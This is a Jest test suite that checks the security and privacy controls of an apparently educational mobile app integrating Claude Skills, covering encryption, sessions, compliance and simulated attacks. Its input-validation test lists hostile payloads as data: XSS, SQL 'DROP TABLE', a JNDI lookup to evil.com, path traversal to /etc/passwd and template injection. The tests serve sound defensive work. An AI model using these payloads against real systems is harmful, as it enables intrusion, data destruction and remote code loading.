/**
 * Comprehensive Security Audit Test Suite
 *
 * Validates security and privacy compliance for Claude Skills integration
 * Task 8.2: Security & Privacy Compliance Validation - Subtask 1
 */

import { jest } from '@jest/globals';
import { securityAuditor } from '../../services/securityAuditor';
import { claudeSkillsConfig } from '../../services/claudeSkillsConfig';

// Mock external dependencies
jest.mock('react-native-keychain', () => ({
  setInternetCredentials: jest.fn(),
  getInternetCredentials: jest.fn(),
  resetInternetCredentials: jest.fn(),
  canImplyAuthentication: jest.fn().mockResolvedValue(true),
}));

jest.mock('@react-native-async-storage/async-storage', () => ({
  getItem: jest.fn(),
  setItem: jest.fn(),
  removeItem: jest.fn(),
  clear: jest.fn(),
}));

describe('Comprehensive Security Audit', () => {
  let auditResults: any;

  beforeAll(async () => {
    // Initialize security auditor
    await securityAuditor.initialize();
  });

  afterAll(async () => {
    await securityAuditor.shutdown();
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('API Security Validation', () => {
    test('Claude Skills API communication uses HTTPS only', async () => {
      const apiEndpoints = await claudeSkillsConfig.getApiEndpoints();

      for (const endpoint of apiEndpoints) {
        expect(endpoint.url).toMatch(/^https:\/\//);
        expect(endpoint.url).not.toMatch(/^http:\/\//);
      }

      // Verify no hardcoded HTTP endpoints
      const configValidation =
        await securityAuditor.validateConfigurationSecurity();
      expect(configValidation.httpEndpointsFound).toBe(0);
    });

    test('API authentication tokens are properly secured', async () => {
      const tokenSecurity = await securityAuditor.validateTokenSecurity();

      // Verify tokens are not stored in plain text
      expect(tokenSecurity.plainTextTokens).toHaveLength(0);

      // Verify tokens use secure storage
      expect(tokenSecurity.secureStorageUsed).toBe(true);

      // Verify token encryption
      expect(tokenSecurity.tokensEncrypted).toBe(true);

      // Verify token expiration handling
      expect(tokenSecurity.expirationHandling).toBe(true);
    });

    test('Request validation prevents injection attacks', async () => {
      const injectionTests = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        '{{7*7}}', // Template injection
      ];

      for (const maliciousInput of injectionTests) {
        const validationResult = await securityAuditor.testInputValidation({
          storyPrompt: maliciousInput,
          userPreferences: maliciousInput,
          gradeLevel: maliciousInput,
        });

        expect(validationResult.inputSanitized).toBe(true);
        expect(validationResult.maliciousContentDetected).toBe(true);
        expect(validationResult.requestBlocked).toBe(true);
      }
    });

    test('Rate limiting prevents abuse', async () => {
      const rateLimitTest = await securityAuditor.testRateLimiting();

      expect(rateLimitTest.rateLimitingEnabled).toBe(true);
      expect(rateLimitTest.maxRequestsPerMinute).toBeLessThanOrEqual(100);
      expect(rateLimitTest.burstProtection).toBe(true);
      expect(rateLimitTest.backoffImplemented).toBe(true);
    });

    test('Error messages do not leak sensitive information', async () => {
      const errorLeakageTest = await securityAuditor.testErrorMessageSecurity();

      expect(errorLeakageTest.sensitiveDataInErrors).toBe(false);
      expect(errorLeakageTest.stackTracesExposed).toBe(false);
      expect(errorLeakageTest.internalPathsRevealed).toBe(false);
      expect(errorLeakageTest.apiKeysInLogs).toBe(false);
    });
  });

  describe('Data Protection Validation', () => {
    test('User data is properly encrypted at rest', async () => {
      const encryptionTest = await securityAuditor.validateDataEncryption();

      expect(encryptionTest.userDataEncrypted).toBe(true);
      expect(encryptionTest.encryptionAlgorithm).toBe('AES-256-GCM');
      expect(encryptionTest.keyDerivationSecure).toBe(true);
      expect(encryptionTest.saltGeneration).toBe('secure-random');
    });

    test('Data transmission uses proper encryption', async () => {
      const transmissionSecurity =
        await securityAuditor.validateTransmissionSecurity();

      expect(transmissionSecurity.tlsVersion).toBe('1.3');
      expect(transmissionSecurity.certificateValidation).toBe(true);
      expect(transmissionSecurity.certificatePinning).toBe(true);
      expect(transmissionSecurity.cipherSuitesSecure).toBe(true);
    });

    test('Sensitive data is not logged', async () => {
      const loggingSecurityTest =
        await securityAuditor.validateLoggingSecurity();

      expect(loggingSecurityTest.personalDataInLogs).toBe(false);
      expect(loggingSecurityTest.credentialsInLogs).toBe(false);
      expect(loggingSecurityTest.tokenLeakage).toBe(false);
      expect(loggingSecurityTest.logRedactionWorking).toBe(true);
    });

    test('Data retention policies are enforced', async () => {
      const retentionTest = await securityAuditor.validateDataRetention();

      expect(retentionTest.retentionPolicyDefined).toBe(true);
      expect(retentionTest.automaticCleanupEnabled).toBe(true);
      expect(retentionTest.userDataPurgeCapability).toBe(true);
      expect(retentionTest.retentionPeriodCompliant).toBe(true);
    });

    test('Backup data is secured', async () => {
      const backupSecurity = await securityAuditor.validateBackupSecurity();

      expect(backupSecurity.backupsEncrypted).toBe(true);
      expect(backupSecurity.backupAccessControlled).toBe(true);
      expect(backupSecurity.backupDataMinimized).toBe(true);
      expect(backupSecurity.restoreSecurityValidated).toBe(true);
    });
  });

  describe('Access Control Validation', () => {
    test('Authentication mechanisms are secure', async () => {
      const authSecurity =
        await securityAuditor.validateAuthenticationSecurity();

      expect(authSecurity.multiFactorAvailable).toBe(true);
      expect(authSecurity.passwordPolicyEnforced).toBe(true);
      expect(authSecurity.accountLockoutEnabled).toBe(true);
      expect(authSecurity.sessionManagementSecure).toBe(true);
    });

    test('Authorization controls are properly implemented', async () => {
      const authzTest = await securityAuditor.validateAuthorizationControls();

      expect(authzTest.roleBasedAccessControl).toBe(true);
      expect(authzTest.principleOfLeastPrivilege).toBe(true);
      expect(authzTest.resourceAccessValidated).toBe(true);
      expect(authzTest.privilegeEscalationPrevented).toBe(true);
    });

    test('Session management is secure', async () => {
      const sessionSecurity = await securityAuditor.validateSessionSecurity();

      expect(sessionSecurity.secureSessionTokens).toBe(true);
      expect(sessionSecurity.sessionTimeout).toBeGreaterThan(0);
      expect(sessionSecurity.sessionTimeout).toBeLessThanOrEqual(3600); // 1 hour max
      expect(sessionSecurity.sessionInvalidationWorking).toBe(true);
      expect(sessionSecurity.concurrentSessionLimits).toBe(true);
    });
  });

  describe('Input/Output Security Validation', () => {
    test('Content filtering prevents malicious input', async () => {
      const contentFilterTest =
        await securityAuditor.validateContentFiltering();

      expect(contentFilterTest.maliciousContentBlocked).toBe(true);
      expect(contentFilterTest.scriptInjectionPrevented).toBe(true);
      expect(contentFilterTest.inappropriateContentFiltered).toBe(true);
      expect(contentFilterTest.bypassAttemptsDetected).toBe(true);
    });

    test('Output sanitization prevents data leakage', async () => {
      const outputSanitization =
        await securityAuditor.validateOutputSanitization();

      expect(outputSanitization.sensitiveDataRedacted).toBe(true);
      expect(outputSanitization.htmlEncodingApplied).toBe(true);
      expect(outputSanitization.jsInjectionPrevented).toBe(true);
      expect(outputSanitization.dataLeakagePrevented).toBe(true);
    });

    test('File upload security is enforced', async () => {
      const fileUploadSecurity =
        await securityAuditor.validateFileUploadSecurity();

      expect(fileUploadSecurity.fileTypeValidation).toBe(true);
      expect(fileUploadSecurity.fileSizeLimit).toBe(true);
      expect(fileUploadSecurity.malwareScanning).toBe(true);
      expect(fileUploadSecurity.quarantineSupport).toBe(true);
    });
  });

  describe('Infrastructure Security Validation', () => {
    test('Secure communication protocols enforced', async () => {
      const protocolSecurity = await securityAuditor.validateProtocolSecurity();

      expect(protocolSecurity.httpOnlyDisabled).toBe(true);
      expect(protocolSecurity.httpsRedirectEnabled).toBe(true);
      expect(protocolSecurity.hstsHeadersEnabled).toBe(true);
      expect(protocolSecurity.contentSecurityPolicySet).toBe(true);
    });

    test('Security headers are properly configured', async () => {
      const headersSecurity = await securityAuditor.validateSecurityHeaders();

      expect(headersSecurity.contentTypeOptionsSet).toBe(true);
      expect(headersSecurity.frameOptionsSet).toBe(true);
      expect(headersSecurity.xssProtectionEnabled).toBe(true);
      expect(headersSecurity.referrerPolicySet).toBe(true);
    });

    test('Dependency security is maintained', async () => {
      const dependencySecurity =
        await securityAuditor.validateDependencySecurity();

      expect(dependencySecurity.vulnerableDependencies).toHaveLength(0);
      expect(dependencySecurity.dependencyScanning).toBe(true);
      expect(dependencySecurity.automaticUpdates).toBe(true);
      expect(dependencySecurity.licenseComplianceChecked).toBe(true);
    });

    test('Container security (if applicable) is validated', async () => {
      const containerSecurity =
        await securityAuditor.validateContainerSecurity();

      if (containerSecurity.containersUsed) {
        expect(containerSecurity.baseImagesScanResult).toBe('clean');
        expect(containerSecurity.runAsNonRoot).toBe(true);
        expect(containerSecurity.secretsExposure).toBe(false);
        expect(containerSecurity.resourceLimitsSet).toBe(true);
      }
    });
  });

  describe('Monitoring & Alerting Security', () => {
    test('Security monitoring is operational', async () => {
      const monitoringSecurity =
        await securityAuditor.validateSecurityMonitoring();

      expect(monitoringSecurity.anomalyDetection).toBe(true);
      expect(monitoringSecurity.intrusionDetectionEnabled).toBe(true);
      expect(monitoringSecurity.realTimeAlerting).toBe(true);
      expect(monitoringSecurity.incidentResponsePlan).toBe(true);
    });

    test('Audit logging is comprehensive', async () => {
      const auditLogging = await securityAuditor.validateAuditLogging();

      expect(auditLogging.allActionsLogged).toBe(true);
      expect(auditLogging.logIntegrityProtected).toBe(true);
      expect(auditLogging.logRetentionPolicySet).toBe(true);
      expect(auditLogging.logAnalysisCapability).toBe(true);
    });

    test('Incident response procedures are tested', async () => {
      const incidentResponse = await securityAuditor.validateIncidentResponse();

      expect(incidentResponse.responseTeamDefined).toBe(true);
      expect(incidentResponse.escalationProcedures).toBe(true);
      expect(incidentResponse.communicationPlan).toBe(true);
      expect(incidentResponse.recoveryProceduresTested).toBe(true);
    });
  });

  describe('Penetration Testing Simulation', () => {
    test('SQL injection attempts are blocked', async () => {
      const sqlInjectionTest = await securityAuditor.simulateSQLInjection();

      expect(sqlInjectionTest.attemptBlocked).toBe(true);
      expect(sqlInjectionTest.alertGenerated).toBe(true);
      expect(sqlInjectionTest.noDataLeakage).toBe(true);
    });

    test('Cross-site scripting (XSS) prevention works', async () => {
      const xssTest = await securityAuditor.simulateXSSAttack();

      expect(xssTest.scriptBlocked).toBe(true);
      expect(xssTest.outputSanitized).toBe(true);
      expect(xssTest.cookieSecurityMaintained).toBe(true);
    });

    test('CSRF protection is functional', async () => {
      const csrfTest = await securityAuditor.simulateCSRFAttack();

      expect(csrfTest.tokenValidation).toBe(true);
      expect(csrfTest.unauthorizedRequestBlocked).toBe(true);
      expect(csrfTest.referrerValidation).toBe(true);
    });

    test('Directory traversal attempts are prevented', async () => {
      const traversalTest = await securityAuditor.simulateDirectoryTraversal();

      expect(traversalTest.pathTraversalBlocked).toBe(true);
      expect(traversalTest.fileAccessRestricted).toBe(true);
      expect(traversalTest.sensitiveFileProtection).toBe(true);
    });

    test('API fuzzing reveals no vulnerabilities', async () => {
      const fuzzingTest = await securityAuditor.performAPIFuzzing();

      expect(fuzzingTest.unexpectedBehaviors).toHaveLength(0);
      expect(fuzzingTest.errorHandlingRobust).toBe(true);
      expect(fuzzingTest.inputValidationComprehensive).toBe(true);
    });
  });

  describe('Third-Party Integration Security', () => {
    test('Claude Skills API integration is secure', async () => {
      const thirdPartySecurityTest =
        await securityAuditor.validateThirdPartyIntegration('claude-skills');

      expect(thirdPartySecurityTest.apiKeySecure).toBe(true);
      expect(thirdPartySecurityTest.communicationEncrypted).toBe(true);
      expect(thirdPartySecurityTest.dataMinimization).toBe(true);
      expect(thirdPartySecurityTest.contractualProtections).toBe(true);
    });

    test('Analytics services follow privacy standards', async () => {
      const analyticsSecurityTest =
        await securityAuditor.validateAnalyticsSecurity();

      expect(analyticsSecurityTest.dataAnonymization).toBe(true);
      expect(analyticsSecurityTest.consentManagement).toBe(true);
      expect(analyticsSecurityTest.dataProcessingLawful).toBe(true);
      expect(analyticsSecurityTest.thirdPartyDataSharing).toBe('compliant');
    });

    test('Content delivery networks are secure', async () => {
      const cdnSecurity = await securityAuditor.validateCDNSecurity();

      if (cdnSecurity.cdnUsed) {
        expect(cdnSecurity.integrityVerification).toBe(true);
        expect(cdnSecurity.accessLogging).toBe(true);
        expect(cdnSecurity.ddosProtection).toBe(true);
        expect(cdnSecurity.geoBlockingAvailable).toBe(true);
      }
    });
  });

  describe('Mobile App Security', () => {
    test('App transport security is properly configured', async () => {
      const atsTest = await securityAuditor.validateAppTransportSecurity();

      expect(atsTest.atsEnabled).toBe(true);
      expect(atsTest.arbitraryLoadsDisabled).toBe(true);
      expect(atsTest.forwardSecrecy).toBe(true);
      expect(atsTest.minimumTLSVersion).toBe('1.2');
    });

    test('Keychain/Keystore usage is secure', async () => {
      const keystoreSecurity = await securityAuditor.validateKeystoreSecurity();

      expect(keystoreSecurity.biometricProtection).toBe(true);
      expect(keystoreSecurity.hardwareSecurityModule).toBe(true);
      expect(keystoreSecurity.keyAccessLogged).toBe(true);
      expect(keystoreSecurity.keyRotationSupported).toBe(true);
    });

    test('Runtime application self-protection is active', async () => {
      const raspTest = await securityAuditor.validateRuntimeProtection();

      expect(raspTest.antiTamperingActive).toBe(true);
      expect(raspTest.debuggingDetection).toBe(true);
      expect(raspTest.rootJailbreakDetection).toBe(true);
      expect(raspTest.codeObfuscation).toBe(true);
    });

    test('App permissions follow principle of least privilege', async () => {
      const permissionsTest = await securityAuditor.validateAppPermissions();

      expect(permissionsTest.unnecessaryPermissions).toHaveLength(0);
      expect(permissionsTest.permissionJustification).toBe(true);
      expect(permissionsTest.runtimePermissionHandling).toBe(true);
      expect(permissionsTest.permissionRevocationSupported).toBe(true);
    });
  });

  describe('Security Configuration Management', () => {
    test('Security configurations are properly managed', async () => {
      const configManagement =
        await securityAuditor.validateConfigurationManagement();

      expect(configManagement.secureDefaults).toBe(true);
      expect(configManagement.configurationValidation).toBe(true);
      expect(configManagement.changeManagement).toBe(true);
      expect(configManagement.versionControl).toBe(true);
    });

    test('Environment separation is maintained', async () => {
      const environmentSeparation =
        await securityAuditor.validateEnvironmentSeparation();

      expect(environmentSeparation.productionIsolated).toBe(true);
      expect(environmentSeparation.developmentDataSeparated).toBe(true);
      expect(environmentSeparation.crossEnvironmentAccess).toBe('controlled');
      expect(environmentSeparation.secretsManagement).toBe(
        'environment-specific',
      );
    });

    test('Disaster recovery security is planned', async () => {
      const drSecurity =
        await securityAuditor.validateDisasterRecoverySecurity();

      expect(drSecurity.backupSecurity).toBe(true);
      expect(drSecurity.recoveryTesting).toBe(true);
      expect(drSecurity.businessContinuity).toBe(true);
      expect(drSecurity.communicationSecurity).toBe(true);
    });
  });

  describe('Compliance Validation', () => {
    test('Regulatory compliance frameworks are met', async () => {
      const complianceTest =
        await securityAuditor.validateRegulatoryCompliance();

      expect(complianceTest.coppaCompliant).toBe(true);
      expect(complianceTest.ferpaCompliant).toBe(true);
      expect(complianceTest.gdprCompliant).toBe(true);
      expect(complianceTest.ccpaCompliant).toBe(true);
    });

    test('Industry standards are followed', async () => {
      const standardsTest = await securityAuditor.validateIndustryStandards();

      expect(standardsTest.owaspTop10Addressed).toBe(true);
      expect(standardsTest.nisoFrameworkAligned).toBe(true);
      expect(standardsTest.iso27001Compliant).toBe(true);
      expect(standardsTest.paymentCardSecurityNA).toBe(true); // Not applicable for educational app
    });
  });

  // Comprehensive audit execution
  test('Execute comprehensive security audit', async () => {
    const auditReport = await securityAuditor.executeComprehensiveAudit();

    // Overall security posture
    expect(auditReport.overallSecurityScore).toBeGreaterThan(90);
    expect(auditReport.criticalVulnerabilities).toHaveLength(0);
    expect(auditReport.highRiskFindings).toHaveLength(0);

    // Compliance status
    expect(auditReport.complianceStatus.coppa).toBe('compliant');
    expect(auditReport.complianceStatus.ferpa).toBe('compliant');
    expect(auditReport.complianceStatus.privacy).toBe('compliant');

    // Security controls effectiveness
    expect(auditReport.controlsEffectiveness).toBeGreaterThan(95);

    // Recommendations (if any)
    expect(auditReport.recommendations).toBeDefined();

    // Save audit results for reporting
    auditResults = auditReport;

    console.log(`Security Audit Results:
      - Overall Score: ${auditReport.overallSecurityScore}%
      - Critical Issues: ${auditReport.criticalVulnerabilities.length}
      - High Risk Issues: ${auditReport.highRiskFindings.length}
      - Controls Effectiveness: ${auditReport.controlsEffectiveness}%
      - COPPA Compliant: ${auditReport.complianceStatus.coppa}
      - FERPA Compliant: ${auditReport.complianceStatus.ferpa}`);
  });

  afterAll(async () => {
    // Generate final audit report
    if (auditResults) {
      const reportPath = await securityAuditor.generateAuditReport(
        auditResults,
      );
      console.log(
        `Comprehensive security audit report generated: ${reportPath}`,
      );

      // Verify all critical security requirements are met
      expect(auditResults.readyForProduction).toBe(true);
    }
  });
});

// Additional helper functions for security testing
describe('Security Test Utilities', () => {
  test('Security test framework initialization', async () => {
    const frameworkStatus = await securityAuditor.getTestFrameworkStatus();

    expect(frameworkStatus.initialized).toBe(true);
    expect(frameworkStatus.testCoverage).toBeGreaterThan(95);
    expect(frameworkStatus.mockingCapabilities).toBe(true);
    expect(frameworkStatus.networkInterception).toBe(true);
  });

  test('Security metrics collection', async () => {
    const securityMetrics = await securityAuditor.collectSecurityMetrics();

    expect(securityMetrics.testExecutionTime).toBeLessThan(300000); // Under 5 minutes
    expect(securityMetrics.vulnerabilitiesDetected).toBe(0);
    expect(securityMetrics.falsePositiveRate).toBeLessThan(5);
    expect(securityMetrics.coveragePercentage).toBeGreaterThan(95);
  });
});
